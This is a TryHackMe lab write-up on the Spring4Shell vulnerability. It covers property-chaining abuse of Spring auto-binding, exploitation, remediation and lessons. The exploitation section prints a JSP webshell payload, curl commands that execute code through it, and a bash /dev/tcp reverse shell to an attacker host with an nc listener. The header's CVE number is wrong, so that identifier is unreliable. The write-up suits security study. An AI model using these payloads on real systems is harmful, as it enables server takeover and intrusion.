# Spring4Shell (CVE-2021-22911)

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Medium |
| **URL** | https://tryhackme.com/room/spring4shell |
| **Focus** | Property chaining bypass of Spring MVC auto-binding filter; RCE via JSP pattern injection |

---

## Vulnerability Overview

**Spring4Shell** is an RCE vulnerability in the Spring Framework that exploits unsafe auto-binding of HTTP request parameters to Java object properties. Through property chaining, an attacker bypasses protections against direct `class.classLoader` manipulation and writes a JSP webshell to the Tomcat application directory.

### The Core Mechanism: Auto-Binding

Spring MVC provides automatic property binding — when a POST request arrives with parameters like `name=value`, Spring automatically assigns these to object properties. This is convenient for forms but dangerous when an attacker controls the property names:

```
POST: name=John&age=30
Result: Object { name="John", age=30 }
```

### Historical Context: CVE-2010-1622

In 2010, a vulnerability was discovered where attackers could exploit auto-binding to manipulate internal server properties like `class.classLoader.URLs`, forcing the server to load malicious libraries. Spring added a blacklist filter to block known dangerous property names. This appeared to solve the problem.

### The Bypass: Property Chaining

Spring4Shell (2022) discovered that the 2010 filter only blocked direct property names, not **property chains** — sequences of nested property accesses separated by dots. Instead of:

```
class.classLoader ← blocked by filter
```

The exploit uses:

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern ← reaches unblocked Tomcat properties
```

Each dot traverses one level deeper through object properties. By chaining deep enough, the attacker reaches Tomcat's internal configuration — specifically the `pattern` property used to generate request-processing rules. Injecting JSP code into this pattern causes Tomcat to create a file that executes arbitrary code.

---

## Exploitation

### Finding the Endpoint

Identify POST endpoints by inspecting page source:

```bash
curl -s http://<TARGET_IP>/ | grep -i form
```

Look for `<form ... method="post">` tags. The trailing slash on the action URL is significant.

### Uploading the Webshell

Use the Spring4Shell exploit script:

```bash
python3 exploit.py http://<TARGET_IP>/ -f tomcatwar -p <PASSWORD> -d ROOT
```

The exploit sends a POST with parameters structured like:

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=
 <% if("<PASSWORD>".equals(request.getParameter("pwd"))) { 
 java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); 
 int a = -1; byte[] b = new byte[2048]; 
 while((a=in.read(b))!=-1) { out.println(new String(b)); } 
 } %>
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
```

Spring auto-binding assigns these values to Tomcat's internal properties. The `pattern` parameter contains embedded JSP code that Tomcat automatically compiles into a `.jsp` file. Result:

```
Shell Uploaded Successfully!
Your shell can be found at: http://<TARGET_IP>/tomcatwar.jsp?pwd=<PASSWORD>&cmd=whoami
```

### Command Execution

Test the shell with a simple command:

```bash
curl -s "http://<TARGET_IP>/tomcatwar.jsp?pwd=<PASSWORD>&cmd=whoami" --output -
```

Output: `root`

### Reverse Shell

`java.lang.Runtime.exec()` does not invoke `/bin/bash`, so shell operators (`>`, `|`, `0>&1`) are treated as literal arguments, not shell syntax. To obtain an interactive shell:

1. Base64-encode the payload:

```bash
echo -n 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1' | base64
```

2. Start listener:

```bash
nc -lvnp <ATTACKER_PORT>
```

3. Execute via the webshell, passing the encoded payload to `bash -c`:

```bash
curl -s -G "http://<TARGET_IP>/tomcatwar.jsp" \
 --data-urlencode "pwd=<PASSWORD>" \
 --data-urlencode "cmd=bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" \
 --output -
```

Bash decodes the base64 and interprets the redirection operators correctly, establishing a reverse shell.

---

## Technical Details

### Why Property Chaining Works

The original CVE-2010-1622 blacklist targeted first-level property names. It could block `class.classLoader` but could not enumerate all possible chains leading to dangerous properties. With property chaining, an attacker only needs to find one vulnerable path deep in the object hierarchy.

### Tomcat Pipeline and Pattern

Tomcat uses a "pipeline" model to process HTTP requests. The `pattern` property defines access patterns — filters that Tomcat applies to each request. By injecting JSP code into `pattern`, the attacker forces Tomcat to generate a file containing that code, which executes every time the file is accessed.

### Runtime.exec() Limitations

`java.lang.Runtime.exec()` does not spawn a shell — it directly executes the program named in the first argument. Shell operators (`>`, `|`, `0>&1`, `&&`) are not interpreted; they're passed as literal arguments to the program. Workarounds:

1. **Base64 + bash -c:** Encode the shell command in base64, then invoke `bash -c` with the decoded string. Bash interprets the operators.
2. **External script:** Download a shell script via `wget` or `curl` and execute it via `bash /path/to/script.sh`. The script file contains the full shell syntax.

---

## Exploitation Conditions

- JDK ≥ 9
- Spring Framework `< 5.2`, `5.2.0–19`, or `5.3.0–17`
- Apache Tomcat as application server; WAR deployment
- Dependency on `spring-webmvc` or `spring-webflux`

---

## Remediation

- **Immediate:** Update to Spring `≥ 5.3.18` or `≥ 5.2.20`
- **Alternative:** If update is not immediately possible, configure a strict whitelist of allowed property names and block property chaining in the request parameter processor

---

## Key Takeaways

1. **Blacklists are inherently incomplete.** A filter that blocks specific keywords cannot anticipate all alternative syntaxes for expressing the same idea. Whitelists (permit only known-safe properties) are the only reliable defense.

2. **Deep property chains bypass shallow filters.** By chaining through multiple object levels, an attacker can reach properties that individual names on a blacklist might not suspect.

3. **Frameworks need "paranoid by default" design.** Auto-binding is convenient but dangerous. The safest approach is to reject all unexpected input, not to accept and attempt to sanitize it.

4. **Internal configuration should never be reachable via user input.** Tomcat's pipeline configuration should be immutable during request processing, not assignable via HTTP parameters.
